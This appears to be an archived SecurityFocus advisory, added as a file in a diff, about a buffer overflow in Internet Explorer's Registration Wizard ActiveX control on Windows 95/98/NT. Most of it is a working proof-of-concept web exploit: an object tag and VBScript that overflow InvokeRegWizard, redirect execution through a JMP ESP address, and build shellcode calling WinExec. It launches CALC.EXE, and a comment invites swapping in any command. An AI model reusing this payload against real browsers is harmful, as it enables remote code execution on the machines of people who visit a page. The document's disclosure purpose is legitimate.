@@ -1,0 +1,87 @@
+Microsoft Internet Explorer 4.1/5.0 for Windows 95/Windows NT 4,Windows 98 Registration Wizard Buffer Overflow Vulnerability
+
+source: http://www.securityfocus.com/bid/671/info
+
+
+There is a buffer overflow in the Internet Explorer Registration Wizard control (regwizc.dll). This control is marked 'Safe for Scripting' . Arbitrary commands may be executed if the control is run in a malicious manner. 
+
+REGWIZC
+
+The Registration Wizard control used by Microsoft to 
+register MS products also contains a buffer overrun in 
+the 'InvokeRegWizard' method. When called with a long 
+string, pre-pended with '/i', we can gain control of the 
+RET address and exploit the control in a similar manner as 
+the PDF control. This exploit will cause a 'Regwiz.log' 
+file to be created in the temporary directory, and once 
+again will execute CALC.EXE and terminate the host.
+
+<object classid="clsid:50E5E3D1-C07E-11D0-B9FD-
+00A0249F6B00" id="RegWizObj">
+</object>
+
+<script language="VbScript" ><!--
+
+msgbox("Registration Wizard Buffer Overrun" + Chr(10) 
++ "Written by Shane Hird")
+
+expstr = "/i 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+'We overflowed to the RET point of the stack
+'No NULL's allowed so ret to <JMP ESP> in Shell32
+
+expstr = expstr & Chr(235)	'Address in SHELL32, Win98 
+(7FD035EB) of JMP ESP
+expstr = expstr & Chr(53)	'You may need to use a 
+different address
+expstr = expstr & Chr(208)
+expstr = expstr & Chr(127)
+
+
+'NOP for debugging purposes
+expstr = expstr + Chr(144)
+
+'MOV EDI, ESP
+expstr = expstr + Chr(139) + Chr(252)
+
+'ADD EDI, 19 (Size of code)
+expstr = expstr + Chr(131) + Chr(199) + Chr(25)
+
+'PUSH EAX (Window Style EAX = 41414141)
+expstr = expstr + Chr(80)
+
+'PUSH EDI (Address of command line)
+expstr = expstr + Chr(87)
+
+'MOV EDX, BFFA0960 (WinExec, Win98)
+expstr = expstr + Chr(186) + Chr(96) + Chr(9) + Chr(250) + 
+Chr(191)
+
+'CALL EDX
+expstr = expstr + Chr(255) + Chr(210)
+
+'XOR EAX, EAX
+expstr = expstr + Chr(51) + Chr(192)
+
+'PUSH EAX
+expstr = expstr + Chr(80)
+
+'MOV EDX, BFF8D4CA (ExitProcess, Win98)
+expstr = expstr + Chr(186) + Chr(202) + Chr(212) + Chr(248) 
++ Chr(191)
+
+'CALL EDX
+expstr = expstr + Chr(255) + Chr(210)
+
+'Replace with any command + 0 (automatically appended)
+expstr = expstr + "CALC.EXE"
+
+RegWizObj.InvokeRegWizard(expstr)
+
+--></script>
